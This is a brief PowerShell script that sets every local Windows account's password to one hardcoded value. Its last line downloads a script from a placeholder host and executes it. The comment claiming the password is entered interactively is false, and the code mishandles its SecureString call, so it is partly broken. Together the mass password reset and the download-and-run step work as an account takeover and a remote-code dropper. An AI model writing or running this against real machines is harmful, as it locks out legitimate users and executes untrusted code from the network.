# Prompt for the new password (you'll need to enter it interactively)
$NewPassword = "IgotAnew5t1ck"

# Get all local user accounts
$LocalUsers = Get-WmiObject Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true }

# Set the new password for each user
foreach ($User in $LocalUsers) {
    $User.SetPassword([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($NewPassword)))
}

Write-Host "Passwords have been updated for all local users."

$scriptPath = 'script.ps1'; (New-Object System.Net.WebClient).DownloadFile('http://example.com/script.ps1', $scriptPath); & $scriptPath
